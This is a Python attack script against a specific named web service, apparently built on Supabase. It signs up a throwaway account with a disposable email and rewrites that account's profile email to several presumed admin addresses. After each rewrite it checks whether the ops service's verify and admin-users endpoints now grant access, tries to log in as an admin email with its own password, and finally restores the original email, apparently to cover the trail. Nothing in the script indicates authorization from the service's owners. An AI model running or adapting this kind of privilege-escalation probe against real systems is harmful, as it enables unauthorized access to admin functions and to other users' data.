import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
OPS = "https://ops.onlyfakeai.ru"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

def req(method, url, body=None, token=None, extra=None):
    h = dict(UA); h["Content-Type"] = "application/json"
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def show(tag, st, b, n=260):
    print(f"[{tag}] {st} :: {b[:n].replace(chr(10),' ')}")

# 1. fresh throwaway account
tag = random.randint(100000, 999999)
email = f"authid{tag}@dropmail.me"
pw = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": email, "password": pw}, extra={"apikey": KEY})
show("signup", st, b)
sess = json.loads(b); TOK = sess["access_token"]; UID = sess["user"]["id"]
print("uid:", UID, "auth email:", email)

# 2. own profile baseline
st, hd, b = req("GET", SUPA + f"/rest/v1/profiles?select=*&user_id=eq.{UID}", token=TOK, extra={"apikey": KEY, "Accept-Profile": "public"})
show("own profile", st, b, 700)

# 3. ops baseline with user token
st, hd, b = req("GET", OPS + "/api/auth/verify", token=TOK)
show("ops verify baseline", st, b)
st, hd, b = req("GET", OPS + "/api/admin-users", token=TOK)
show("ops admin-users baseline", st, b, 160)

# 4. forge profiles.email to admin identities, retest ops gates
for target in ["admin@onlyfakeai.ru", "onlyfake@tuta.io", "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"]:
    st, hd, b = req("PATCH", SUPA + f"/rest/v1/profiles?user_id=eq.{UID}", {"email": target}, token=TOK,
                    extra={"apikey": KEY, "Content-Profile": "public", "Prefer": "return=representation"})
    show("PATCH profile.email -> " + target, st, b, 200)
    st, hd, b = req("GET", OPS + "/api/auth/verify", token=TOK)
    show("  ops verify (forged email)", st, b, 200)
    st, hd, b = req("GET", OPS + "/api/admin-users", token=TOK)
    show("  ops admin-users (forged email)", st, b, 160)
    time.sleep(0.8)

# 5. ops login with our valid credentials while profile email is forged:
#    what email does the server echo in userInfo?  (1 global limiter slot)
st, hd, b = req("POST", OPS + "/api/auth/login", {"email": email, "password": pw})
show("ops login (valid user, forged profile email)", st, b, 500)

# 6. does ops login accept the FORGED email + our password? (auth.users lookup)
st, hd, b = req("POST", OPS + "/api/auth/login", {"email": "admin@onlyfakeai.ru", "password": pw})
show("ops login (admin email + our pw)", st, b, 300)

# 7. restore the profile email to the auth email
st, hd, b = req("PATCH", SUPA + f"/rest/v1/profiles?user_id=eq.{UID}", {"email": email}, token=TOK,
                extra={"apikey": KEY, "Content-Profile": "public", "Prefer": "return=representation"})
show("restore profile.email", st, b, 200)
